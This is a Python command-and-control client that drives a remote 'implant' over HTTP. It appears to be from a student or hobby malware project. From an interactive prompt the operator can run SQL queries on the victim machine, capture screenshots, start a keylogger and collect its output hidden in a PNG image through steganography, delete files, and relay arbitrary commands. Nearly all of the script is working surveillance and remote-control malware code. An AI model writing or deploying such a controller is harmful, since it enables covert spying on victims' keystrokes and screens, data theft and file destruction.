#!/usr/bin/env python3
import socket
import requests
from urllib.parse import urljoin
import os
import base64
from utils import *

host = "192.168.20.4"
port = 9000

baseurl = f'http://{host}:{port}'

s = socket.socket()
# host = "18.223.121.137"  # Get local machine name
# host = "127.0.0.1"
# port = 5000  # Reserve a port for your service
# Establish connection with client
while True:  
    message = input("Enter command to the implant:\n")
    if message == "exit":
        # Exit the loop if the command is 'exit'
        break
    # Check if the command is to execute an SQL query
    if 'sql ' in message:
        # Extract the SQL query from the command
        query = message.replace('sql ', '').strip()
        # Send the SQL query to the server
        ret = requests.post(urljoin(baseurl, "/sql"),params={"parameter": query})
        # Print the response from the server
        print(ret.text)
        continue
    # Check if the command is to take a screenshot
    if message.strip()=='shot':
        # Send the screenshot command
        ret = requests.post(urljoin(baseurl, '/shot'))
        # Get the screenshot data from the response
        data = ret.content
        with open('/tmp/tmp_screenshot.png','wb') as f:
            # Write the screenshot to a file
            f.write(data)
            # Open the screenshot using the default image viewer
        os.system('xdg-open /tmp/tmp_screenshot.png')
        continue
    # Check if the command is to start a keylogger
    if message.strip() == 'key':
        ret = requests.post(urljoin(baseurl, '/key'))
         # Confirm that the keylogger started successfully
        if ret.status_code == 200:
            print("key logger started.")
        else:
            print("failed to start keylogger.")
        continue
     # Check if the command is to delete a file
    if 'delete ' in message:
        # Extract the filename from the command
        filename = message.replace('delete ','').strip()
        # Send the delete command
        ret = requests.post(urljoin(baseurl, '/delete'), headers={'Content-type':'application/json'}, json={'filename':filename})
        print(ret.text)
        # Check if the command is to retrieve keylogger data
    if 'getkeylogger' in message:
        data = requests.get(urljoin(baseurl, '/getkeylogger')).text
        # Write the data to a file
        with open('/tmp/tmpkeylogger.png','wb') as f:
            f.write(base64.b64decode(data))
        data = stegano_decrypt('/tmp/tmpkeylogger.png')
        print(data)
        continue
    if 'shutdown' in message:
        res = requests.get(urljoin(baseurl, '/shutdown'))
        print(res.text)
        break
    if " " not in message:
        print("please input the format of [command] [post_body], post body is optional but space is mandatory")
        continue
    command, post_body = message.split(" ", 1)
    r = requests.post("http://{}:{}/{}".format(host, port, command), data={"parameter": post_body})
    print(r.content)
